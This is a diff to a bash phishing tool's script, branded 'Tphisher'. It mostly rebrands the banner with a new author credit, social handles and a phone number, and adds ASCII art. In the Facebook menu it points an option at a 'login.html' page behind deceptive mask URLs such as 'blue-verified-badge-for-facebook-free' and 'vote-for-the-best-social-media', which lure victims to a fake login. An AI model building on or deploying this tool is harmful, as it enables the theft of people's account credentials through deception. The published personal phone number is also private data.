@@ -71,13 +71,24 @@ kill_pid() {
 banner() {
 	cat <<- EOF
 		${ORANGE}              
-		${ORANGE}████████╗██████╗░██╗░░██╗██╗░██████╗██╗░░██╗███████╗██████╗░
-		${ORANGE}╚══██╔══╝██╔══██╗██║░░██║██║██╔════╝██║░░██║██╔════╝██╔══██╗
-		${ORANGE}░░░██║░░░██████╔╝███████║██║╚█████╗░███████║█████╗░░██████╔╝
-		${ORANGE}░░░██║░░░██╔═══╝░██╔══██║██║░╚═══██╗██╔══██║██╔══╝░░██╔══██╗  
-		${ORANGE}░░░██║░░░██║░░░░░██║░░██║██║██████╔╝██║░░██║███████╗██║░░██║
-		${ORANGE}░░░╚═╝░░░╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
+		${ORANGE}███╗   ███╗██████╗      █████╗ ██╗     ██╗  ██╗ █████╗      ██╗
+		${ORANGE}████╗ ████║██╔══██╗    ██╔══██╗██║     ██║  ██║██╔══██╗     ██║
+		${ORANGE}██╔████╔██║██████╔╝    ███████║██║     ███████║███████║     ██║
+		${ORANGE}██║╚██╔╝██║██╔══██╗    ██╔══██║██║     ██╔══██║██╔══██║██   ██║
+		${ORANGE}██║ ╚═╝ ██║██║  ██║    ██║  ██║███████╗██║  ██║██║  ██║╚█████╔╝
+		${ORANGE}╚═╝     ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚════╝ 
 		${RED}Version : 1.0
+		
+		${GREEN}╔══════════════════════╗
+		${ORANGE}AUTHOR ==> Mr Alhaj Islam -- BD Hacker
+		${ORANGE}Tools Name ==> Tphisher _ Phishing Tool
+		${ORANGE}Github ==> FB-CRACK
+		${ORANGE}Facebook ==> M R Alhaj Islam 
+		${ORANGE}Facebook Page ==> BLACK OF CYBER
+		${ORANGE}Facebook Group ==> FB-CRACK
+		${ORANGE}WhatsApp ==> +880 1756745324
+		${GREEN}╚══════════════════════╝
+
 		
 		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by Silent Programmer$ (Tanmay.Tiwari){WHITE}
 	EOF
@@ -94,6 +105,18 @@ banner_small() {
 		${BLUE}░░░██║░░░██║░░░░░██║░░██║██║██████╔╝██║░░██║███████╗██║░░██║
 		${BLUE}░░░╚═╝░░░╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
 		${WHITE} 1.0
+		${GREEN}╦╦╦╦╦╦▄▀▀▀▀▀▀▄╦╦╦╦╦╦
+		${GREEN}▒▓▒▓▒█╗░░▐░░░╔█▒▓▒▓▒
+		${GREEN}▒▓▒▓▒█║░░▐▄▄░║█▒▓▒▓▒
+		${GREEN}▒▓▒▓▒█╝░░░░░░╚█▒▓▒▓▒
+		${GREEN}╩╩╩╩╩╩▀▄▄▄▄▄▄▀╩╩╩╩╩╩
+		${WHITE}
+		${WHITE}
+		${RED}░░▄▀▀▀▄
+		${RED}░░█░░░█
+		${RED}░███████░░░░░░░░░▄▀▀▄
+		${RED}░██░▀░██░░█▀█▀▀▀▀█░░█░
+		${RED}░███▄███░░▀░▀░░░░░▀▀░░    
 	EOF
 }
 
@@ -405,7 +428,7 @@ site_facebook() {
 			mask='http://blue-verified-badge-for-facebook-free'
 			tunnel_menu;;
 		2 | 02)
-			website="fb_advanced"
+			website="login.html"
 			mask='http://vote-for-the-best-social-media'
 			tunnel_menu;;
 		3 | 03)
